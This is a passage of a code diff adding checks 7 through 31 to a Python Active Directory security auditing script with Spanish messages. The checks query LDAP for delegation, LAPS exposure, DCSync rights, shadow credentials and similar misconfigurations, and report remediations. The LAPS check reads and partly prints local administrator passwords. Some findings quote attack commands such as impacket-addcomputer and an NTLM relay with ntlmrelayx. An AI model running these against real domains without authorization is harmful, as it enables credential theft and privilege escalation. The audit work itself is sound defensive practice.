+            '(&(objectClass=user)(msDS-AllowedToDelegateTo=*))',
+            attributes=['sAMAccountName','msDS-AllowedToDelegateTo'])
+        if conn.entries:
+            targets = []
+            for e in conn.entries:
+                services = e['msDS-AllowedToDelegateTo'].values if hasattr(e['msDS-AllowedToDelegateTo'],'values') else [e['msDS-AllowedToDelegateTo']]
+                targets.append(f"{e.sAMAccountName} → {', '.join(str(s) for s in list(services)[:3])}")
+            finding("ALTO", "Kerberos Delegation",
+                f"Constrained Delegation: {len(conn.entries)} cuenta(s)",
+                targets,
+                "Auditar si los servicios destino son realmente necesarios. Preferir RBCD cuando sea posible. Monitorear S4U2Proxy.",
+                7.0, ["https://attack.mitre.org/techniques/T1134/001/"])
+        else:
+            print(f"  {G}[OK]{W} Sin Constrained Delegation no estándar.")
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+
+def check_08_rbcd(conn, base_dn, ldap3):
+    """CHECK 8: Resource-Based Constrained Delegation"""
+    section("CHECK 08 — RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity)")
+    try:
+        conn.search(base_dn,
+            '(&(objectClass=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))',
+            attributes=['sAMAccountName','msDS-AllowedToActOnBehalfOfOtherIdentity'])
+        if conn.entries:
+            rbcd_targets = [str(e.sAMAccountName) for e in conn.entries]
+            finding("ALTO", "Kerberos Delegation",
+                f"RBCD configurado en {len(rbcd_targets)} máquina(s)",
+                rbcd_targets,
+                "Verificar que los ACEs de RBCD son intencionales. Un atacante con GenericWrite puede abusar de RBCD para tomar control.",
+                7.5, ["https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution"])
+        else:
+            print(f"  {G}[OK]{W} Sin RBCD configurado (o sin permisos para verlo).")
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+
+def check_09_laps(conn, base_dn, ldap3):
+    """CHECK 9: LAPS no desplegado o con exposición"""
+    section("CHECK 09 — LAPS (Local Administrator Password Solution)")
+    try:
+        # Verificar si LAPS está instalado (ms-MCS-AdmPwd attribute)
+        conn.search(base_dn,
+            '(&(objectClass=computer)(ms-MCS-AdmPwd=*))',
+            attributes=['sAMAccountName','ms-MCS-AdmPwd','ms-MCS-AdmPwdExpirationTime'])
+        laps_deployed = bool(conn.entries)
+
+        # Intentar leer contraseñas LAPS (requiere permisos excesivos)
+        exposed_passwords = []
+        for e in conn.entries:
+            pwd = str(e['ms-MCS-AdmPwd'])
+            if pwd and pwd != '[]' and len(pwd) > 2:
+                exposed_passwords.append(f"{e.sAMAccountName}: {pwd[:10]}... ← CONTRASEÑA VISIBLE!")
+
+        if not laps_deployed:
+            # Buscar máquinas SIN LAPS
+            conn.search(base_dn,
+                '(&(objectClass=computer)(!(ms-MCS-AdmPwd=*)))',
+                attributes=['sAMAccountName','operatingSystem'])
+            machines_without = [str(e.sAMAccountName) for e in conn.entries]
+            if machines_without:
+                finding("MEDIO", "LAPS / Local Accounts",
+                    f"LAPS NO desplegado en {len(machines_without)} máquina(s)",
+                    machines_without[:10],
+                    "Desplegar LAPS o Windows LAPS (Windows 2023+) en todas las máquinas. Elimina contraseñas locales compartidas.",
+                    6.5, ["https://docs.microsoft.com/en-us/defender-for-identity/laps"])
+        if exposed_passwords:
+            finding("CRÍTICO", "LAPS / Credential Exposure",
+                f"Contraseñas LAPS VISIBLES para usuarios autenticados ({len(exposed_passwords)} máquinas)",
+                exposed_passwords,
+                "Restringir ACLs en ms-MCS-AdmPwd. Solo Domain Admins y cuentas Helpdesk autorizadas deben tener read access.",
+                9.1, ["https://attack.mitre.org/techniques/T1552/"])
+        elif laps_deployed:
+            print(f"  {G}[OK]{W} LAPS desplegado y contraseñas no accesibles con este usuario.")
+    except Exception as e:
+        if "00002085" in str(e) or "noSuchAttribute" in str(e).lower():
+            print(f"  {Y}[!]{W} LAPS no instalado en este dominio.")
+            finding("BAJO", "LAPS",
+                "LAPS no detectado en el dominio",
+                "No se encontró el atributo ms-MCS-AdmPwd. LAPS podría no estar instalado.",
+                "Instalar y desplegar Microsoft LAPS o Windows LAPS para gestión de contraseñas locales de administrador.",
+                4.0)
+        else:
+            print(f"  {Y}[?]{W} {e}")
+
+def check_10_domain_admins(conn, base_dn, ldap3):
+    """CHECK 10: Cuentas en grupos privilegiados"""
+    section("CHECK 10 — Grupos Privilegiados (Domain Admins, Enterprise Admins, etc.)")
+    privileged_groups = [
+        "Domain Admins", "Enterprise Admins", "Schema Admins",
+        "Administrators", "Account Operators", "Backup Operators",
+        "Print Operators", "Server Operators", "Group Policy Creator Owners"
+    ]
+    try:
+        all_priv_members = {}
+        for group in privileged_groups:
+            conn.search(base_dn,
+                f'(&(objectClass=group)(cn={group}))',
+                attributes=['member'])
+            if conn.entries and conn.entries[0].member:
+                members = conn.entries[0].member.values if hasattr(conn.entries[0].member, 'values') else [conn.entries[0].member]
+                members_clean = []
+                for m in members:
+                    cn_match = re.search(r'CN=([^,]+)', str(m))
+                    if cn_match: members_clean.append(cn_match.group(1))
+                if members_clean:
+                    all_priv_members[group] = members_clean
+
+        if all_priv_members:
+            details = []
+            high_count = sum(len(v) for v in all_priv_members.values())
+            for grp, members in all_priv_members.items():
+                details.append(f"{grp} ({len(members)} miembros): {', '.join(members[:5])}")
+
+            sev = "CRÍTICO" if high_count > 20 else "ALTO" if high_count > 5 else "MEDIO"
+            finding(sev, "Privileged Accounts",
+                f"Grupos Privilegiados con {high_count} miembro(s) total",
+                details,
+                "Aplicar principio de mínimo privilegio. Usar cuentas dedicadas para administración. Auditar regularmente miembros.",
+                7.0 if sev == "MEDIO" else 8.5)
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+
+def check_11_inactive_accounts(conn, base_dn, ldap3):
+    """CHECK 11: Cuentas inactivas y habilitadas"""
+    section("CHECK 11 — Cuentas de Usuario Inactivas (>90 días)")
+    try:
+        from ldap3.utils.conv import format_time
+        # lastLogonTimestamp con 90 días de antigüedad (en 100-nanosecond intervals)
+        # 90 días = 90 * 24 * 3600 * 10000000
+        import struct
+        ninety_days = 90 * 24 * 3600 * 10_000_000
+        # Fecha actual en FILETIME
+        import time
+        now_ft = int((datetime.now(timezone.utc).timestamp() + 11644473600) * 10_000_000)
+        cutoff = now_ft - ninety_days
+        # Convertir a LDAP timestamp string
+        conn.search(base_dn,
+            f'(&(objectClass=user)(!(objectClass=computer))(!(userAccountControl:1.2.840.113556.1.4.803:=2))(lastLogonTimestamp<={cutoff}))',
+            attributes=['sAMAccountName','lastLogonTimestamp','description'],
+            size_limit=50)
+        if conn.entries:
+            users = [str(e.sAMAccountName) for e in conn.entries]
+            finding("MEDIO", "Account Hygiene",
+                f"{len(conn.entries)} Cuentas Habilitadas sin Login >90 días",
+                users[:15],
+                "Deshabilitar o eliminar cuentas inactivas. Implementar revisión trimestral de cuentas. Usar Stale Accounts GPO.",
+                5.0, ["https://attack.mitre.org/techniques/T1078/002/"])
+        else:
+            print(f"  {G}[OK]{W} Sin cuentas inactivas >90 días detectadas.")
+    except Exception as e:
+        print(f"  {Y}[?]{W} Error cuentas inactivas: {e}")
+
+def check_12_password_not_required(conn, base_dn, ldap3):
+    """CHECK 12: Cuentas que no requieren contraseña"""
+    section("CHECK 12 — Cuentas sin Contraseña Requerida (PASSWD_NOTREQD)")
+    try:
+        conn.search(base_dn,
+            '(&(objectClass=user)(!(objectClass=computer))(userAccountControl:1.2.840.113556.1.4.803:=32))',
+            attributes=['sAMAccountName','userAccountControl'])
+        if conn.entries:
+            users = [str(e.sAMAccountName) for e in conn.entries]
+            finding("ALTO", "Weak Authentication",
+                f"{len(users)} Cuenta(s) sin Contraseña Requerida (PASSWD_NOTREQD)",
+                users,
+                "Limpiar flag PASSWD_NOTREQD: Set-ADUser -Identity usuario -PasswordNotRequired $false",
+                7.2)
+        else:
+            print(f"  {G}[OK]{W} Sin cuentas con PASSWD_NOTREQD.")
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+
+def check_13_password_never_expires(conn, base_dn, ldap3):
+    """CHECK 13: Contraseñas que nunca expiran"""
+    section("CHECK 13 — Contraseñas que Nunca Expiran")
+    try:
+        conn.search(base_dn,
+            '(&(objectClass=user)(!(objectClass=computer))(userAccountControl:1.2.840.113556.1.4.803:=65536)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
+            attributes=['sAMAccountName','description'])
+        if conn.entries:
+            users = [str(e.sAMAccountName) for e in conn.entries]
+            sev = "ALTO" if len(users) > 20 else "MEDIO"
+            finding(sev, "Password Hygiene",
+                f"{len(users)} Cuenta(s) Habilitadas con Contraseña que Nunca Expira",
+                users[:15],
+                "Configurar expiración de contraseñas. Excepciones solo para cuentas de servicio usando MSA/gMSA.",
+                6.0)
+        else:
+            print(f"  {G}[OK]{W} Sin cuentas con contraseña que nunca expira (habilitadas).")
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+
+def check_14_admin_count(conn, base_dn, ldap3):
+    """CHECK 14: Cuentas con adminCount=1 (herencia de permisos)"""
+    section("CHECK 14 — adminCount=1 (Protected Users heredados)")
+    try:
+        conn.search(base_dn,
+            '(&(objectClass=user)(!(objectClass=computer))(adminCount=1)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
+            attributes=['sAMAccountName','memberOf'])
+        if conn.entries:
+            users = [str(e.sAMAccountName) for e in conn.entries]
+            finding("MEDIO", "Privileged Accounts",
+                f"{len(users)} Cuentas con adminCount=1 (incluso si ya no son admin)",
+                users[:15],
+                "Limpiar cuentas que ya no son privilegiadas pero tienen adminCount=1. Hereda ACLs del AdminSDHolder y puede ser explotado.",
+                5.5, ["https://attack.mitre.org/techniques/T1078/002/"])
+        else:
+            print(f"  {G}[OK]{W} Sin cuentas con adminCount=1 no privilegiadas.")
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+
+def check_15_dcsync_rights(conn, base_dn, ldap3):
+    """CHECK 15: Privilegios DCSync (GetChangesAll)"""
+    section("CHECK 15 — DCSync Rights (DS-Replication-Get-Changes-All)")
+    try:
+        import binascii
+        # Buscar ACEs en el domain object con derechos de replicación
+        conn.search(base_dn, '(objectClass=domain)',
+                    attributes=['nTSecurityDescriptor'],
+                    controls=[('1.2.840.113556.1.4.801', True, None)])
+        if conn.entries:
+            sd = conn.entries[0]['nTSecurityDescriptor']
+            sd_str = str(sd)
+            # Buscar GUID de GetChanges / GetChangesAll en el descriptor
+            get_changes      = "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2"
+            get_changes_all  = "1131f6ab-9c07-11d1-f79f-00c04fc2dcd2"
+            get_changes_filt = "89e95b76-444d-4c62-991a-0facbeda640c"
+
+            guids_found = []
+            if get_changes_all.replace('-','').lower() in sd_str.lower():
+                guids_found.append("DS-Replication-Get-Changes-All detectado en nTSecurityDescriptor")
+            if get_changes_filt.replace('-','').lower() in sd_str.lower():
+                guids_found.append("DS-Replication-Get-Changes-In-Filtered-Set detectado")
+
+            if guids_found:
+                finding("CRÍTICO", "DCSync / Replication",
+                    "Posibles Derechos DCSync en el Objeto Dominio",
+                    guids_found + ["Verificar con: (Get-ObjectAcl -DistinguishedName 'DC=...' -ResolveGUIDs | Where-Object {$_.ObjectAceType -match 'Replication'})"],
+                    "Remover ACEs de replicación no autorizados. Solo Domain Controllers deben tener GetChangesAll.",
+                    9.8, ["https://attack.mitre.org/techniques/T1003/006/"])
+            else:
+                print(f"  {G}[OK]{W} Sin derechos DCSync obvios detectados via LDAP (verificar con PowerView para análisis completo).")
+        else:
+            print(f"  {Y}[?]{W} No se pudo leer nTSecurityDescriptor del dominio.")
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+
+def check_16_machine_account_quota(conn, base_dn, ldap3):
+    """CHECK 16: ms-DS-MachineAccountQuota — permiso para unir máquinas al dominio"""
+    section("CHECK 16 — Machine Account Quota (ms-DS-MachineAccountQuota)")
+    try:
+        conn.search(base_dn, '(objectClass=domain)',
+                    attributes=['ms-DS-MachineAccountQuota'])
+        if conn.entries:
+            quota = int(str(conn.entries[0]['ms-DS-MachineAccountQuota'] or 10))
+            if quota > 0:
+                finding("MEDIO", "Domain Configuration",
+                    f"ms-DS-MachineAccountQuota = {quota} (cualquier usuario puede unir hasta {quota} máquinas al dominio)",
+                    [f"Quota actual: {quota}",
+                     "Permite a atacantes con cuentas bajas crear cuentas de máquina para RBCD y otros ataques.",
+                     "Explotable con: impacket-addcomputer -computer-name 'EVIL$' -computer-pass 'Password1' -dc-host DC"],
+                    "Cambiar ms-DS-MachineAccountQuota a 0. Solo admins deben poder unir máquinas.",
+                    6.5, ["https://blog.netspi.com/machineaccountquota-is-useful-sometimes/"])
+            else:
+                print(f"  {G}[OK]{W} ms-DS-MachineAccountQuota = 0 (seguro).")
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+
+def check_17_guest_account(conn, base_dn, ldap3):
+    """CHECK 17: Cuenta Guest habilitada"""
+    section("CHECK 17 — Cuenta Guest Habilitada")
+    try:
+        conn.search(base_dn,
+            '(&(objectClass=user)(cn=Guest)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))',
+            attributes=['sAMAccountName','userAccountControl'])
+        if conn.entries:
+            finding("ALTO", "Account Hygiene",
+                "Cuenta Guest HABILITADA en el Dominio",
+                ["La cuenta Guest permite acceso sin autenticación a recursos compartidos.",
+                 "Vector de escalación y movimiento lateral."],
+                "Deshabilitar inmediatamente: Disable-ADAccount -Identity Guest",
+                7.0)
+        else:
+            print(f"  {G}[OK]{W} Cuenta Guest deshabilitada.")
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+
+def check_18_gpo_analysis(conn, base_dn, ldap3):
+    """CHECK 18: GPOs — configuraciones de seguridad críticas"""
+    section("CHECK 18 — Group Policy Objects (GPOs)")
+    try:
+        conn.search(f"CN=Policies,CN=System,{base_dn}",
+            '(objectClass=groupPolicyContainer)',
+            attributes=['cn','displayName','gPCFileSysPath','versionNumber'])
+        if conn.entries:
+            gpo_count = len(conn.entries)
+            print(f"  {C}[+]{W} {gpo_count} GPOs encontrados en el dominio")
+            # Buscar GPOs con paths de red (para detectar GPOs con scripts)
+            network_gpos = [str(e.displayName) for e in conn.entries
+                           if e.gPCFileSysPath and '\\\\' in str(e.gPCFileSysPath)]
+            if network_gpos:
+                finding("INFO", "GPO Audit",
+                    f"{gpo_count} GPOs detectados — Auditoría recomendada",
+                    [f"GPOs en paths de red: {', '.join(network_gpos[:5])}",
+                     "Ejecutar: BloodHound para análisis completo de ACLs de GPOs",
+                     "Verificar: Get-GPO -All | Get-GPOReport -ReportType XML"],
+                    "Auditar GPOs con BloodHound. Verificar ACEs que permitan escritura en GPOs a usuarios no admin.",
+                    0.0)
+        else:
+            print(f"  {D}[i]{W} Sin GPOs accesibles (puede requerir autenticación).")
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+
+def check_19_trusts(conn, base_dn, ldap3):
+    """CHECK 19: Domain Trusts — relaciones de confianza"""
+    section("CHECK 19 — Domain Trusts")
+    try:
+        conn.search(base_dn, '(objectClass=trustedDomain)',
+                    attributes=['cn','trustDirection','trustType','trustAttributes'])
+        if conn.entries:
+            trusts = []
+            for t in conn.entries:
+                direction = {1:"Inbound (ellos confían en nosotros)", 2:"Outbound (nosotros confiamos en ellos)", 3:"Bidireccional"}.get(int(str(t.trustDirection or 0)), "Desconocido")
+                attrs = int(str(t.trustAttributes or 0))
+                transitive = "SID Filtering: " + ("DESHABILITADO ⚠" if not (attrs & 64) else "habilitado")
+                trusts.append(f"{t.cn} → {direction} | {transitive}")
+
+            finding("MEDIO", "Domain Trusts",
+                f"{len(trusts)} Trust(s) de Dominio Detectado(s)",
+                trusts,
+                "Auditar cada trust. Habilitar SID Filtering. Evaluar si trusts bidireccionales son necesarios. Usar selectiveauthentication.",
+                5.5, ["https://attack.mitre.org/techniques/T1482/"])
+        else:
+            print(f"  {G}[OK]{W} Sin domain trusts externos detectados.")
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+
+def check_20_recycle_bin(conn, base_dn, ldap3):
+    """CHECK 20: AD Recycle Bin no habilitado"""
+    section("CHECK 20 — AD Recycle Bin")
+    try:
+        conn.search(f"CN=Optional Features,CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,{base_dn}",
+            '(cn=Recycle Bin Feature)',
+            attributes=['msDS-EnabledFeatureBL'])
+        if conn.entries and conn.entries[0]['msDS-EnabledFeatureBL']:
+            print(f"  {G}[OK]{W} AD Recycle Bin habilitado.")
+        else:
+            finding("BAJO", "AD Configuration",
+                "AD Recycle Bin NO Habilitado",
+                "Sin Recycle Bin, objetos eliminados son irrecuperables. Dificulta recuperación de incidentes.",
+                "Habilitar: Enable-ADOptionalFeature 'Recycle Bin Feature' -Scope ForestOrConfigurationSet -Target $forest",
+                3.0)
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+
+def check_21_spooler_service(conn, base_dn, ldap3):
+    """CHECK 21: PrintNightmare — detectar DCs con Spooler expuesto"""
+    section("CHECK 21 — PrintNightmare / Print Spooler en DCs (CVE-2021-1675)")
+    try:
+        # Los DCs son computadoras con ServerRole incluido
+        conn.search(base_dn,
+            '(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))',
+            attributes=['sAMAccountName','dNSHostName','operatingSystem','operatingSystemVersion'])
+        if conn.entries:
+            dcs = [f"{e.dNSHostName} ({e.operatingSystem})" for e in conn.entries]
+            finding("INFO", "PrintNightmare",
+                f"{len(dcs)} Domain Controller(s) detectado(s) — Verificar Print Spooler",
+                dcs + ["Verificar manualmente: Get-Service -Name Spooler -ComputerName DC",
+                       "Si Spooler activo en DC → vulnerable a PrintNightmare (CVE-2021-1675)"],
+                "Deshabilitar Print Spooler en todos los DCs: Set-Service -Name Spooler -StartupType Disabled -ComputerName DC",
+                8.8, ["https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675"])
+        else:
+            print(f"  {D}[i]{W} Sin DCs detectados en este contexto.")
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+
+def check_22_krbtgt_password_age(conn, base_dn, ldap3):
+    """CHECK 22: Edad de la contraseña de KRBTGT"""
+    section("CHECK 22 — KRBTGT Password Age (Golden Ticket defense)")
+    try:
+        conn.search(base_dn,
+            '(&(objectClass=user)(sAMAccountName=krbtgt))',
+            attributes=['pwdLastSet','sAMAccountName'])
+        if conn.entries:
+            krbtgt = conn.entries[0]
+            pwd_set = str(krbtgt.pwdLastSet)
+            if pwd_set == '0' or not pwd_set:
+                finding("ALTO", "Golden Ticket Defense",
+                    "KRBTGT: Contraseña nunca cambiada o timestamp no disponible",
+                    ["Contraseña de KRBTGT posiblemente muy antigua.",
+                     "Si un atacante tiene el hash KRBTGT → puede forjar Golden Tickets válidos indefinidamente."],
+                    "Cambiar contraseña de KRBTGT DOS VECES (con 10h entre cambios). Documentar el proceso en SLA de seguridad.",
+                    8.0, ["https://attack.mitre.org/techniques/T1558/001/"])
+            else:
+                # Calcular edad aproximada del password
+                try:
+                    # FILETIME to datetime
+                    ft = int(pwd_set)
+                    if ft > 0:
+                        import datetime as dt
+                        epoch = dt.datetime(1601, 1, 1, tzinfo=timezone.utc)
+                        pwd_dt = epoch + dt.timedelta(microseconds=ft // 10)
+                        age_days = (datetime.now(timezone.utc) - pwd_dt).days
+                        if age_days > 180:
+                            finding("MEDIO", "Golden Ticket Defense",
+                                f"KRBTGT: Contraseña tiene {age_days} días (recomendado <180)",
+                                [f"Última rotación estimada: hace {age_days} días",
+                                 "KRBTGT viejo aumenta ventana de Golden Ticket attacks."],
+                                "Rotar KRBTGT dos veces con intervalo de replicación entre cada cambio.",
+                                5.5)
+                        else:
+                            print(f"  {G}[OK]{W} KRBTGT rotado hace ~{age_days} días.")
+                except:
+                    print(f"  {D}[i]{W} KRBTGT pwdLastSet: {pwd_set}")
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+
+def check_23_protected_users(conn, base_dn, ldap3):
+    """CHECK 23: Admins fuera del grupo Protected Users"""
+    section("CHECK 23 — Protected Users Group (defensa contra Pass-the-Hash)")
+    try:
+        # Obtener Domain Admins
+        conn.search(base_dn, '(&(objectClass=group)(cn=Domain Admins))', attributes=['member'])
+        das = set()
+        if conn.entries and conn.entries[0].member:
+            members = conn.entries[0].member.values if hasattr(conn.entries[0].member,'values') else [conn.entries[0].member]
+            for m in members:
+                cn_match = re.search(r'CN=([^,]+)', str(m))
+                if cn_match: das.add(cn_match.group(1).lower())
+
+        # Obtener Protected Users
+        conn.search(base_dn, '(&(objectClass=group)(cn=Protected Users))', attributes=['member'])
+        protected = set()
+        if conn.entries and conn.entries[0].member:
+            members = conn.entries[0].member.values if hasattr(conn.entries[0].member,'values') else [conn.entries[0].member]
+            for m in members:
+                cn_match = re.search(r'CN=([^,]+)', str(m))
+                if cn_match: protected.add(cn_match.group(1).lower())
+
+        not_protected = das - protected
+        if not_protected:
+            finding("ALTO", "Protected Users",
+                f"{len(not_protected)} Domain Admin(s) FUERA del grupo Protected Users",
+                list(not_protected),
+                "Agregar todos los DA y cuentas privilegiadas al grupo Protected Users. Previene Pass-the-Hash, credenciales en memoria y delegación.",
+                7.5, ["https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group"])
+        else:
+            print(f"  {G}[OK]{W} Todos los Domain Admins están en Protected Users.")
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+
+def check_24_dns_admins(conn, base_dn, ldap3):
+    """CHECK 24: Miembros del grupo DnsAdmins (DLL injection en DNS)"""
+    section("CHECK 24 — DnsAdmins Group (DLL Injection Privilege Escalation)")
+    try:
+        conn.search(base_dn, '(&(objectClass=group)(cn=DnsAdmins))', attributes=['member'])
+        if conn.entries and conn.entries[0].member:
+            members = conn.entries[0].member.values if hasattr(conn.entries[0].member,'values') else [conn.entries[0].member]
+            members_clean = []
+            for m in members:
+                cn_match = re.search(r'CN=([^,]+)', str(m))
+                if cn_match: members_clean.append(cn_match.group(1))
+            if members_clean:
+                finding("ALTO", "DnsAdmins Escalation",
+                    f"DnsAdmins tiene {len(members_clean)} miembro(s) — Escalación a SYSTEM posible",
+                    members_clean,
+                    "Vaciar el grupo DnsAdmins. Usar privilegios específicos para gestión DNS en vez de este grupo.",
+                    8.0, ["https://medium.com/@esnesenon/feature-not-bug-dnsadmin-to-dc-compromise-in-one-line-a0f779b8dc83"])
+        else:
+            print(f"  {G}[OK]{W} DnsAdmins vacío o no accesible.")
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+
+def check_25_backup_operators(conn, base_dn, ldap3):
+    """CHECK 25: Backup Operators — pueden dumpejar NTDS.dit"""
+    section("CHECK 25 — Backup Operators (potencial dump de NTDS.dit)")
+    try:
+        conn.search(base_dn, '(&(objectClass=group)(cn=Backup Operators))', attributes=['member'])
+        if conn.entries and conn.entries[0].member:
+            members_val = conn.entries[0].member.values if hasattr(conn.entries[0].member,'values') else [conn.entries[0].member]
+            members_clean = []
+            for m in members_val:
+                cn_match = re.search(r'CN=([^,]+)', str(m))
+                if cn_match: members_clean.append(cn_match.group(1))
+            if members_clean:
+                finding("ALTO", "Privileged Groups",
+                    f"Backup Operators: {len(members_clean)} miembro(s) — Pueden dumpejar NTDS.dit",
+                    members_clean,
+                    "Vaciar Backup Operators si no es necesario. Monitorear uso de SeBackupPrivilege. Usar soluciones de backup dedicadas.",
+                    8.0, ["https://attack.mitre.org/techniques/T1003/003/"])
+        else:
+            print(f"  {G}[OK]{W} Backup Operators vacío.")
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+
+def check_26_exchange_permissions(conn, base_dn, ldap3):
+    """CHECK 26: Exchange — permisos de writeDACL en el dominio"""
+    section("CHECK 26 — Exchange Windows Permissions (WriteDACL → DCSync)")
+    try:
+        conn.search(base_dn, '(&(objectClass=group)(cn=Exchange Windows Permissions))', attributes=['member'])
+        if conn.entries:
+            member_count = 0
+            if conn.entries[0].member:
+                vals = conn.entries[0].member.values if hasattr(conn.entries[0].member,'values') else [conn.entries[0].member]
+                member_count = len([v for v in vals if v])
+            if member_count > 0:
+                finding("CRÍTICO", "Exchange Escalation",
+                    f"Exchange Windows Permissions: {member_count} miembro(s) — WriteDACL en el dominio",
+                    [f"{member_count} objetos en el grupo",
+                     "Exchange Windows Permissions tiene WriteDACL sobre el objeto dominio.",
+                     "Si un atacante compromete Exchange, puede otorgarse derechos DCSync."],
+                    "Aplicar Microsoft Exchange Security Hotfix. Usar split permissions model. Auditar ACLs del objeto dominio.",
+                    9.8, ["https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/",
+                          "https://github.com/gdedrouas/Exchange-AD-Privesc"])
+        else:
+            print(f"  {G}[OK]{W} Exchange Windows Permissions no encontrado (Exchange no instalado o ya parcheado).")
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+
+def check_27_ldap_signing(conn, base_dn, ldap3):
+    """CHECK 27: LDAP Signing no requerido"""
+    section("CHECK 27 — LDAP Signing y Channel Binding")
+    try:
+        conn.search(f"CN=Default Domain Controllers Policy,CN=Policies,CN=System,{base_dn}",
+            '(objectClass=groupPolicyContainer)',
+            attributes=['gPCFileSysPath','displayName'])
+        print(f"  {D}[i]{W} Verificar LDAP signing requiere leer GPO files:")
+        print(f"  {D}    Registro: HKLM\\SYSTEM\\CurrentControlSet\\Services\\NTDS\\Parameters\\LDAPServerIntegrity{W}")
+        print(f"  {D}    0=None, 1=Negotiate, 2=Required{W}")
+        print(f"  {Y}    Probar automáticamente:{W} ldap-signing-check.py / nmap --script ldap-rootdse -p 389")
+        finding("INFO", "LDAP Security",
+            "LDAP Signing — Verificar Manualmente",
+            ["Si LDAPServerIntegrity < 2 → permite LDAP relay attacks",
+             "Exploit: NTLM relay via Responder + ntlmrelayx.py --ldate",
+             f"nmap: nmap -p 389 --script ldap-rootdse {args.dc}"],
+            "GPO: Domain Controller: LDAP server signing requirements = Require signing. Habilitar LDAP Channel Binding.",
+            6.5, ["https://msrc.microsoft.com/update-guide/vulnerability/ADV190023"])
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+
+def check_28_rodc_krbtgt(conn, base_dn, ldap3):
+    """CHECK 28: RODCs — contraseñas en Allowed Password Replication Policy"""
+    section("CHECK 28 — RODCs (Read-Only Domain Controllers)")
+    try:
+        conn.search(base_dn,
+            '(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=67108864))',
+            attributes=['sAMAccountName','dNSHostName','msDS-RevealedList'])
+        if conn.entries:
+            rodcs = [str(e.dNSHostName or e.sAMAccountName) for e in conn.entries]
+            finding("INFO", "RODC Security",
+                f"{len(rodcs)} RODC(s) detectado(s) — Auditar Password Replication Policy",
+                rodcs + ["Verificar: Get-ADDomainController -Filter {IsReadOnly -eq $true}",
+                         "Auditar: (Get-ADDomainController RODC).ComputerObjectDN | Get-ADObject -Properties 'msDS-RevealedList'"],
+                "Revisar cuentas en Allowed PRP. Evitar cuentas privilegiadas en RODCs.",
+                0.0)
+        else:
+            print(f"  {D}[i]{W} Sin RODCs detectados.")
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+
+def check_29_shadow_credentials(conn, base_dn, ldap3):
+    """CHECK 29: Shadow Credentials (msDS-KeyCredentialLink)"""
+    section("CHECK 29 — Shadow Credentials (msDS-KeyCredentialLink)")
+    try:
+        conn.search(base_dn,
+            '(&(objectClass=user)(msDS-KeyCredentialLink=*))',
+            attributes=['sAMAccountName','msDS-KeyCredentialLink'])
+        if conn.entries:
+            users = [str(e.sAMAccountName) for e in conn.entries]
+            finding("CRÍTICO", "Shadow Credentials",
+                f"Shadow Credentials en {len(users)} cuenta(s) — Posible backdoor de autenticación",
+                users,
+                "Auditar msDS-KeyCredentialLink con: Get-ADObject -Filter {msDS-KeyCredentialLink -ne '$null'} | Limpiar entradas no autorizadas.",
+                9.0, ["https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab"])
+        else:
+            print(f"  {G}[OK]{W} Sin Shadow Credentials detectados.")
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+
+def check_30_gpo_scripts(conn, base_dn, ldap3):
+    """CHECK 30: Scripts en GPOs — posibles persistencias"""
+    section("CHECK 30 — GPO Scripts (Logon/Logoff/Startup/Shutdown)")
+    try:
+        conn.search(f"CN=Policies,CN=System,{base_dn}",
+            '(objectClass=groupPolicyContainer)',
+            attributes=['cn','displayName','gPCFileSysPath'])
+
+        gpos_with_scripts = []
+        for gpo in conn.entries:
+            path = str(gpo.gPCFileSysPath or '')
+            name = str(gpo.displayName or gpo.cn)
+            if '\\\\' in path:
+                gpos_with_scripts.append(f"{name}: {path}")
+
+        if gpos_with_scripts:
+            finding("INFO", "GPO Scripts",
+                f"{len(gpos_with_scripts)} GPO(s) con paths de scripts detectados",
+                gpos_with_scripts[:8] + ["Revisar scripts en: SYSVOL\\\\dominio\\\\Policies\\\\{{GUID}}\\\\Machine\\\\Scripts\\\\"],
+                "Auditar scripts de GPO regularmente. Monitorear modificaciones en SYSVOL.",
+                0.0)
+        else:
+            print(f"  {D}[i]{W} Sin GPOs con scripts accesibles detectados.")
+    except Exception as e:
+        print(f"  {Y}[?]{W} {e}")
+
+def check_31_fine_grained_policy(conn, base_dn, ldap3):
+    """CHECK 31: Fine-Grained Password Policies (PSOs)"""
+    section("CHECK 31 — Fine-Grained Password Policies (PSOs)")
+    try:
+        conn.search(f"CN=Password Settings Container,CN=System,{base_dn}",
+            '(objectClass=msDS-PasswordSettings)',
